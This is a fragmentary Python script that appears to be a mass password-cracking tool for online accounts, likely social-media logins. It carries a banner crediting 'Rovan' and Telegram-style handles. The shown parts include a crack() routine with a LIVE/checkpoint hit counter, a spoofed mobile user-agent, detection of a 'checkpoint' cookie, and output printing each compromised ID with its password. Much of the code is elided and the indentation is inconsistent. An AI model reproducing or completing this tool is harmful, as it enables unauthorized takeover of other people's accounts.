...
\033[0;34m╔══\033[0;32m[•] OWNER         \033[0;34m╔══\033[0;32m[•] Rovan
\033[0;34m╠══\033[0;91m[•] CH            \033[0;34m╠══\033[0;91m[•] @Rovanhack
\033[0;34m╚══\033[0;32m[•] BRO           \033[0;34m╚══\033[0;32m[•] @hama404m
# LOGIN
# new cooki 
def login():
	os.system('clear')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \033[1;36m└[{loop}\033[1;33m/\033[1;32m{len(id)}]  \033[1;32m└LIVE ๛  \033[1;30m{ok}  \033[1;32m└CP ๛  \033[1;30m{cp}  {bo}\033[1;36m{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\033[1;34m└[ Rovan❌CP ] ID : {idf}  [+] PASSWORD : {pw}{N} ')       
